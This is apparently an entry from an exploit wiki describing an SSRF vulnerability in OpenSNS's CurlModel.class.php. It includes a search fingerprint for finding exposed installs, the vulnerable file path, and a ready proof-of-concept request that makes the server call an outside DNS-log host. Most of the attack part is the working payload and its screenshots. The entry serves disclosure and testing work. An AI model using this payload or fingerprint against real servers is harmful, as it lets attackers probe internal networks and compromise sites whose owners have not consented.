# OpenSNS CurlModel.class.php SSRF vulnerability

## Vulnerability Description

There is an SSRF vulnerability in the curl method in the OpenSNS CurlModel.class.php file. The vulnerability attacker can detect intranet information.

## Vulnerability Impact

<span style="background-color:rgb(18, 160, 255); padding: 2px 4px; border-radius: 3px; color: white;">OpenSNS</span>

## Network surveying and mapping

<span style="background-color:rgb(18, 160, 255); padding: 2px 4px; border-radius: 3px; color: white;">icon_hash="1167011145"</span>

## Vulnerability reappears

The login page is as follows

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1634371874190-3653480e-380a-4cdc-81fc-7d560bc7d0dc-20220313235733223.png)

The vulnerable file is `Application/Admin/Model/CurlModel.class.php`

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1634372194099-77c5fe31-6860-4f22-b7d8-4c7d7c5e1ecb.png)

Construct POC

```php
/?s=weibo/share/shareBox&query=app=Admin%26model=Curl%26method=curl%26id=https://92aq2z.dnslog.cn
```

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1634372283531-85b34ccd-7259-4164-bb67-1806e32fa6ec.png)